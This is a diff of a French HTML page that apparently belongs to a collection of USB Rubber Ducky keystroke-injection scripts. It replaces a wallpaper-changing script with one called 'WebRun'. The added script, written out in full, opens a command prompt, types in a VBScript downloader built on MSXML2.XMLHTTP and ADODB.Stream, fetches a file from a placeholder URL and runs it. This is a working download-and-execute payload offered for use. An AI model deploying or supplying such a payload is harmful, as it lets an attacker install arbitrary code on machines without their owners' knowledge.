@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="../favicon-32x32.png" sizes="32x32" />
-  <title>Script - Background</title>
+  <title>Script - Internet App</title>
   <!-- Font Awesome -->
   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
   <!-- Bootstrap core CSS -->
@@ -98,31 +98,32 @@
   <main class="mt-5 pt-5">
     <div class="container">
       
-      <h3 class="ducky-blue-text pb-4">Background</h3>
+      <h3 class="ducky-blue-text pb-4">WebRun</h3>
 
       <div>
         <div class="py-4">
           <h4 class="ducky-blue-text">Système(s) d'exploitation :</h4>
-          <p class="ducky-blue-text"><i class="fab fa-windows"></i> Windows</p>
+          <p class="ducky-blue-text"><i class="fab fa-windows"></i> Windows 7</p>
         </div>
 
         <div class="py-4">
           <h4 class="ducky-blue-text">Fonctionnalités :</h4>
-          <p class="ducky-blue-text">Change automatiquement le fond d'écran de ta machine vers n'importe quelle image en ligne.</p>
+          <p class="ducky-blue-text">Télécharge puis exécute une application depuis Internet.</p>
         </div>
 
         <div class="py-4">
           <h4 class="ducky-blue-text">Déroulement du script :</h4>
 
           <ol>
-            <li class="ducky-blue-text">Ouverture du navigateur à la page de l'image</li>
-            <li class="ducky-blue-text">Téléchargement de l'image en PNG</li>
-            <li class="ducky-blue-text">Définition de l'image en tant que fond d'écran</li>
+            <li class="ducky-blue-text">Ouverture de l'invité de commande</li>
+            <li class="ducky-blue-text">Création d'un script VBS qui téléchargera puis exécutera une application depuis Internet</li>
+            <li class="ducky-blue-text">Lancement du script VBS</li>
+            <li class="ducky-blue-text">Lancement de l'application téléchargée</li>
           </ol>
         </div>
 
         <div class="text-center py-4">
-          <a href="../resources/scripts/dh-background.txt" download>
+          <a href="../resources/scripts/dh-webrun.txt" download>
             <button type="button" class="btn btn-primary ducky-blue rounded">Télécharger</button>
           </a>
         </div>
@@ -132,41 +133,39 @@
 
           <pre class="line-numbers mdb-color darken-3"><code>
             <span class="new-line white-text"><span class="orange-text">DELAY</span> 3000</span>
-            <span class="new-line blue-text">GUI R</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> iexplore LIEN DE L'IMAGE</span>
+            <span class="new-line blue-text">ESCAPE</span>
+            <span class="new-line blue-text">CONTROL ESCAPE</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cmd</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
             <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 2000</span>
-            <span class="new-line blue-text">ALT F</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> a</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> %USERPROFILE%\PLACEHOLDER.PNG</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
+            <span class="new-line white-text"><span class="orange-text">DELAY</span> 400</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> copy con download.vbs</span>
             <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line blue-text">CTRL W</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line blue-text">CTRL ESC</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> paint</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))</span>
             <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 500</span> 
-            <span class="new-line blue-text">CTRL O</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> %USERPROFILE%\PLACEHOLDER.PNG</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()</span>
             <span class="new-line blue-text">ENTER</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 300</span> 
-            <span class="new-line blue-text">ALT F</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> k</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> f</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 300</span> 
-            <span class="new-line blue-text">ALT F</span>
-            <span class="new-line white-text"><span class="orange-text">DELAY</span> 100</span>
-            <span class="new-line white-text"><span class="cyan-text">STRING</span> x</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> If objXMLHTTP.Status = 200 Then</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line blue-text">CTRL Z</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> cscript download.vbs [URL DE L'APPLICATION ICI]</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> [NOM DE L'APPLICATION ICI]</span>
+            <span class="new-line blue-text">ENTER</span>
+            <span class="new-line white-text"><span class="cyan-text">STRING</span> exit</span>
+            <span class="new-line blue-text">ENTER</span>
           </code></pre>
         </div>
       </div>
@@ -212,3 +211,4 @@
 </body>
 
 </html>
+
